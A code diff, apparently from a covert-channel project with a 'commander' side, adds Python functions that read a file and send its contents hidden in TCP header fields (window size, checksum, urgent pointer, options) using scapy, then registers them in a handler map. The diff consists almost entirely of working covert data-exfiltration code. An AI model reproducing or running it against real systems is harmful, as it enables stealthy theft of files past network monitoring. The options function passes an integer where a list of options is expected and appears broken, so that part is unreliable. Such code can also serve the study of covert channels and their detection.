@@ -1825,6 +1825,9 @@ def transfer_file_tcp_flags(client_sock: socket.socket,
     Hides file data covertly in TCP headers using the
     various control flag fields.
 
+    @attention The recipient may not be able to recover the original data due to
+               various flags being set
+
     @note Bit length
         The control flags field for TCP headers is 9 bits for the different
         flags (ECN, ACK, SYN, FIN, etc.)
@@ -1873,6 +1876,231 @@ def transfer_file_tcp_flags(client_sock: socket.socket,
         send(packet, verbose=0)
 
 
+def transfer_file_tcp_window_size(client_sock: socket.socket,
+                                  dest_ip: str,
+                                  dest_port: int,
+                                  src_port: int,
+                                  file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    window size field.
+
+    @note Bit length
+        The window size field for TCP headers is 16 bits (2 bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):  # 16 bit chunks
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        window_data = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, window=window_data)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_tcp_chksum(client_sock: socket.socket,
+                             dest_ip: str,
+                             dest_port: int,
+                             src_port: int,
+                             file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    checksum field.
+
+    @note Bit length
+        The checksum field for TCP headers is 16 bits (2 bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):  # 16 bit chunks
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        chksum_data = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, chksum=chksum_data)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_tcp_urgent_ptr(client_sock: socket.socket,
+                                 dest_ip: str,
+                                 dest_port: int,
+                                 src_port: int,
+                                 file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    urgent pointer field.
+
+    @note Bit length
+        The urgent pointer field for TCP headers is 16 bits (2 bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):  # 16 bit chunks
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        urg_ptr_data = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, urgptr=urg_ptr_data)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_tcp_options(client_sock: socket.socket,
+                              dest_ip: str,
+                              dest_port: int,
+                              src_port: int,
+                              file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    options field.
+
+    @note Bit length
+        The options field for TCP headers is maximum 320 bits (40 bytes)
+        16 bits chosen here for covert channel
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):  # 16 bit chunks
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        options_data = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, options=options_data)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
 def __get_protocol_header_function_map():
     return {  # A tuple of [Header, Field] => Function
         # a) IPv4 Handlers
@@ -1905,12 +2133,13 @@ def __get_protocol_header_function_map():
         ("TCP", "Destination Port"): transfer_file_tcp_dst_port,
         ("TCP", "Sequence Number"): transfer_file_tcp_seq_num,
         ("TCP", "Acknowledgement Number"): transfer_file_tcp_ack_num,
-        ("TCP", "Data Offset"): transfer_file_tcp_data_offset,  # FIX
-        ("TCP", "Reserved"): transfer_file_tcp_reserved,  # FIX
-        ("TCP", "Flags"): transfer_file_tcp_flags,  # FIX
-        ("TCP", "Window Size"): "F()",
-        ("TCP", "Urgent Pointer"): "F()",
-        ("TCP", "Options"): "F()",
+        ("TCP", "Data Offset"): transfer_file_tcp_data_offset,
+        ("TCP", "Reserved"): transfer_file_tcp_reserved,
+        ("TCP", "Flags"): transfer_file_tcp_flags,
+        ("TCP", "Window Size"): transfer_file_tcp_window_size,
+        ("TCP", "Checksum"): transfer_file_tcp_chksum,
+        ("TCP", "Urgent Pointer"): transfer_file_tcp_urgent_ptr,
+        ("TCP", "Options"): transfer_file_tcp_options,
 
         # d) UDP Handlers
         ("UDP", "Source Port"): "F()",
